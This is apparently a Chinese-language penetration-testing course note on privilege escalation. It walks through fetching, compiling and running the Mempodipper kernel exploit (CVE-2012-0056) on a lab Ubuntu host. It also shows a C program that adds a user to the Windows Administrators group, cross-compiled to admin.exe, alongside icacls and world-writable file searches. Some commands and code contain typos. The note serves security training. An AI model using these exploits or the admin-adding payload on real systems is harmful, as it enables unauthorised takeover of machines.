@@ -1,0 +1,308 @@
+课时48 利用配置不当提权
+
+╋━━━━━━━━━━━━━━━━━━━━━━━╋
+┃利用漏洞提权                                  ┃
+┃Ubuntu11.10                                   ┃
+┃http://old-releases.ubuntu.com/releases/11.10/┃
+┃gcc                                           ┃
+┃sudo apt-cdrom add && sudo apt-get install gcc┃
+┃gcc 18411.c -o exp                            ┃
+┃CVE-2012-0056                                 ┃
+┃/proc/pid/mem                                 ┃
+┃kernels >=2.6.39                              ┃
+┃http://blog.zx2c4.com/749                     ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# searchesploit cve-2012-0056
+--------------------------------------------- ----------------------------------
+ Exploit Title                               |  Path
+                                             |(/usr/share/exploitdb/platforms)
+--------------------------------------------- ----------------------------------
+--------------------------------------------- ----------------------------------
+
+root@kali:~# searchesploit 18411.c
+--------------------------------------------- ----------------------------------
+ Exploit Title                               |  Path
+                                             |(/usr/share/exploitdb/platforms)
+--------------------------------------------- ----------------------------------
+Linux kernel <= 2.6.39 (32-bit & 64-bit) - Mempodipper Local Root (1)
+--------------------------------------------- ----------------------------------
+
+root@kali:~# scp /usr/share/exploitdb/platforms/linux/local/18411.c yuanfh@192.168.1.149:home/yuanfh
+The authenticaity of host '192.168.1.149(192.168.1.149)' can't be established.
+ECDSA key fingerprint is 91:03:af:b1:a3:db:a3:db:94:88:a6:94:bc:a7:bc:b2:f5:fd.
+Are you sure you want to continue connecting(yes/no)? yes
+Warning: Permanently added '192.168.1.149' (ECDSA) to the list of known hosts.
+yuanfh@192.168.1.149's password:
+18411.c
+
+yuanfh@usrv:~$ ls
+18411.c
+yuanfh@usrv:~$ gcc 18411.c -o exp
+
+yuanfh@usrv:~$ ls
+18411.c  exp
+
+yuanfh@usrv:~$ chmod +x exp
+
+yuanfh@usrv:~$ ls
+18411.c  exp
+
+yuanfh@usrv:~$ w
+ 19:16:48 up 8 min , 2 users, load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+yuanfh   tty1	                   19:09    7:07  0.71s  0.62s -bash
+yuanfh   pts/0    192.168.1.118    19:11    0.00s 0.53s  0.00s w
+
+yuanfh@usrv:~$ ./exp
+===============================
+=          Mempodipper        =
+=           by zx2c4          =
+=          Jan 21, 2012       =
+===============================
+
+[+] Waiting for transferred fd in parent.
+[+] Executing child from child fork.
+[+] Opening parent men /proc/1044/men in child.
+[+] Sending fd 3 to parent.
+[+] Received fd at 5. 
+[+] Assigning fd 5 to stderr.
+[+] Reading su for exit@plt.
+[+] Resolved exit@plt to 0x8049520.
+[+] Calculating su padding.
+[+] Seeking to offset 0x8049514.
+[+] Excuting su with shellcode.
+
+yuanfh@usrv:~$ ls /
+bin    etc        lib         mnt   root  selinux  tmp  vmlinuz
+boot   home       lost+found  opt   run   srv      vsr
+dev    initrd.img media       proc  sbin  sys      var
+
+yuanfh@usrv:~$ ls /mnt/
+
+yuanfh@usrv:~$ ls /media/
+cdrom
+
+yuanfh@usrv:~$ ls /media/cdrom/
+
+yuanfh@usrv:~$ sudo mount /dev/cdrom /media/cdrom
+mount: black device /dev/sr0 is write-protected, mounting read-only
+
+yuanfh@usrv:~$ ls /media/cdrom/
+boot          dists   install   md5sum.txt  pool     REAIME.diskdefines
+cdromupgrade  doc     isolinux  pics        preseed  ubuntu
+
+yuanfh@usrv:~$ cat /etc/apt/soures.list
+deb cdrom:[Ubuntu-Server 11.10 _Oneiric Ocelot_ - Release i386 (20111011)]/ oneiric main restricted
+deb http://Ubuntu.uestc.edu.cn/ubuntu/ oneiric main restricted universe multiverse
+deb http://Ubuntu.uestc.edu.cn/ubuntu/ oneiric-backprots main restricted universe multiverse
+deb http://Ubuntu.uestc.edu.cn/ubuntu/ oneiric-proposed main restricted universe multiverse
+deb http://Ubuntu.uestc.edu.cn/ubuntu/ oneiric-security main restricted universe multiverse
+deb http://Ubuntu.uestc.edu.cn/ubuntu/ oneiric-updates main restricted universe multiverse
+deb-src http://ubuntu.uestc.edu.cn/ubuntu/ oneiric main restricted universe multiverse
+deb-src http://ubuntu.uestc.edu.cn/ubuntu/ oneiric-backports restricted universe multiverse
+deb-src http://ubuntu.uestc.edu.cn/ubuntu/ oneiric-proposed restricted universe multiverse
+deb-src http://ubuntu.uestc.edu.cn/ubuntu/ oneiric-security restricted universe multiverse
+deb-src http://ubuntu.uestc.edu.cn/ubuntu/ oneiric-updates restricted universe multiverse
+
+yuanfh@usrv:~$ sudo apt-cdrom add
+Using CD-ROM mount point /mdeia/cdrom/
+Identifying.. [e17dd4e604f0daacc6605e2934bdca-2]
+Scanning disc for index files..
+Found 2 package indexes, 0 source indexes, 0 translation indexs and 1 signatures
+This disc is called:
+'Ubuntu-Server 11.10 _Oneiric Ocelot_ -Release i386 (20111011)'
+Copying package list...gpgv: Signature made Tue 11 Oct 2011 09:52:05 PM CST using DSA key ID FBB75451
+gpgv: Good signature from "Ubuntu CD Image Automatic Signing Key <cdimage@ubuntu.com>"
+Writing new source list
+Source list entries for this disc are:
+deb cdrom:[Ubuntu-Server 11.10 _Oneiric Ocelot_ - Release i386 (20111011)]/ oneiric main restricted
+Repeat this proccess for the rest of the CDs in your set.
+W: Skipping noneistent file /media/cdrom/dists/oneiric/main/binary-i386/Packages
+W: Skipping noneistent file /media/cdrom/dists/oneiric/main/debain-installer/binary-i386/Packages 
+W: Skipping noneistent file /media/cdrom/dists/oneiric/restricted/binary-i386/Packages
+W: Skipping noneistent file /media/cdrom/dists/oneiric/restricted/debain-installer/binary-i386/Packages
+
+yuanfh@usrv:~$ sudo apt-get install gcc
+
+╋━━━━━━━━━━━━━━━━━━━━━━━╋
+┃利用配置不当提权                              ┃
+┃    与漏洞提权相比 更常用的方法               ┃
+┃    企业环境                                  ┃
+┃    补丁更新的全部已经安装                    ┃
+┃    输入变量过滤之外更值得研发关注的安全隐患  ┃
+┃    以system权限启动                          ┃
+┃    NTFS权限允许users修改删除                 ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━╋
+┃用配置不当提权                                ┃
+┃    icacls                                    ┃
+┃    icacls c:\windows\*.exe /save perm /T     ┃
+┃    i586-mingw32msvc-gcc -o admin.exe admin.c ┃
+┃    Find                                      ┃
+┃    find / -perm 777 -exec ls -l {} \         ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━╋
+
+C:\Documents and Settings\Administrator>cd\
+
+C:\>icacls
+ICACLS name /save aclfile [/T] [/C] [/L] [/Q]
+    将匹配名称的文件和文件夹的 DACL 存储到 aclfile 中以便将来与
+    /restore 一起使用。请注意，未保存 SACL、所有者或完整性标签。
+
+ICACLS directory [/substitute SidOld SidNew [...]] /restore aclfile
+                 [/C] [/L] [/Q]
+    将存储的 DACL 应用于目录中的文件。
+
+ICACLS name /setowner user [/T] [/C] [/L] [/Q]
+    更改所有匹配名称的所有者。该选项不会强制更改所有身份；
+    使用 takeown.exe 实用程序可实现该目的。
+
+ICACLS name /findsid Sid [/T] [/C] [/L] [/Q]
+    查找包含显式提及 SID 的 ACL 的所有匹配名称。
+
+ICACLS name /verify [/T] [/C] [/L] [/Q]
+    查找其 ACL 不规范或长度与 ACE 计数不一致的所有文件。
+
+ICACLS name /reset [/T] [/C] [/L] [/Q]
+    为所有匹配文件使用默认继承的 ACL 替换 ACL。
+
+ICACLS name [/grant[:r] Sid:perm[...]]
+       [/deny Sid:perm [...]]
+       [/remove[:g|:d]] Sid[...]] [/T] [/C] [/L]
+       [/setintegritylevel Level:policy[...]]
+
+    /grant[:r] Sid:perm 授予指定的用户访问权限。如果使用 :r，
+        这些权限将替换以前授予的所有显式权限。
+        如果不使用 :r，这些权限将添加到以前授予的所有显式权限。
+
+    /deny Sid:perm 显式拒绝指定的用户访问权限。
+        将为列出的权限添加显式拒绝 ACE，
+        并删除所有显式授予的权限中的相同权限。
+
+    /remove[:[g|d]] Sid 删除 ACL 中所有出现的 SID。使用
+        :g，将删除授予该 SID 的所有权限。使用
+        :d，将删除拒绝该 SID 的所有权限。
+
+    /setintegritylevel [(CI)(OI)] 级别将完整性 ACE 显式添加到所有
+        匹配文件。要指定的级别为以下级别之一:
+            L[ow]
+            M[edium]
+            H[igh]
+        完整性 ACE 的继承选项可以优先于级别，但只应用于
+        目录。
+
+    /inheritance:e|d|r
+        e - 启用继承
+        d - 禁用继承并复制 ACE
+        r - 删除所有继承的 ACE
+
+
+注意:
+    Sid 可以采用数字格式或友好的名称格式。如果给定数字格式，
+    那么请在 SID 的开头添加一个 *。
+
+    /T 指示在以该名称指定的目录下的所有匹配文件/目录上
+        执行此操作。
+
+    /C 指示此操作将在所有文件错误上继续进行。仍将显示错误消息。
+
+    /L 指示此操作在符号链接本身而不是其目标上执行。
+
+    /Q 指示 icacls 应该禁止显示成功消息。
+
+    ICACLS 保留 ACE 项的规范顺序:
+            显式拒绝
+            显式授予
+            继承的拒绝
+            继承的授予
+
+    perm 是权限掩码，可以两种格式之一指定:
+        简单权限序列:
+                N - 无访问权限
+                F - 完全访问权限
+                M - 修改权限
+                RX - 读取和执行权限
+                R - 只读权限
+                W - 只写权限
+                D - 删除权限
+        在括号中以逗号分隔的特定权限列表:
+                DE - 删除
+                RC - 读取控制
+                WDAC - 写入 DAC
+                WO - 写入所有者
+                S - 同步
+                AS - 访问系统安全性
+                MA - 允许的最大值
+                GR - 一般性读取
+                GW - 一般性写入
+                GE - 一般性执行
+                GA - 全为一般性
+                RD - 读取数据/列出目录
+                WD - 写入数据/添加文件
+                AD - 附加数据/添加子目录
+                REA - 读取扩展属性
+                WEA - 写入扩展属性
+                X - 执行/遍历
+                DC - 删除子项
+                RA - 读取属性
+                WA - 写入属性
+        继承权限可以优先于每种格式，但只应用于
+        目录:
+                (OI) - 对象继承
+                (CI) - 容器继承
+                (IO) - 仅继承
+                (NP) - 不传播继承
+                (I) - 从父容器继承的权限
+
+示例:
+
+        icacls c:\windows\* /save AclFile /T
+        - 将 c:\windows 及其子目录下所有文件的
+           ACL 保存到 AclFile。
+
+        icacls c:\windows\ /restore AclFile
+        - 将还原 c:\windows 及其子目录下存在的 AclFile 内
+          所有文件的 ACL。
+
+        icacls file /grant Administrator:(D,WDAC)
+        - 将授予用户对文件删除和写入 DAC 的管理员权限。
+
+        icacls file /grant *S-1-1-0:(D,WDAC)
+        - 将授予由 sid S-1-1-0 定义的用户对文件删除和写入 DAC 的权限。
+
+C:\>icacls boot.ini
+boot.ini BUILTIN\Power Users:<RX>
+         BUILTIN\Administrators:<F>
+         NT AUTHORITY\SYSTEM:<F>
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\>icacls c:\WINDOWS\*.exe /save asd /T
+
+root@kali:~# gedit admin.c
+
+-------------------------------------------------------------
+#include <stdilb.h>
+int main()
+{
+    int i;
+    i=system ("net localgroup admininistrators a /add");
+    return 0;
+}
+--------------------------------------------------------------
+
+root@kali:~# i586-mingw32msvc-gcc
+i586-mingw32msvc-gcc    i586-mingw32msvc-gcov
+
+root@kali:~# i586-mingw32msvc-gcc -o admin.exe admin.c
+
+root@kali:~# file admin.exe
+admin.exe: PE32 executable (console) Intel 80386, for MS Windows
+
+root@kali:~# cp admin.exe /media/sf_D_DRIVE/
+
+root@kali:~# ls -l     //查看文件权限
+
+root@kali:~# find / -perm 777 -exec ls -l {} \
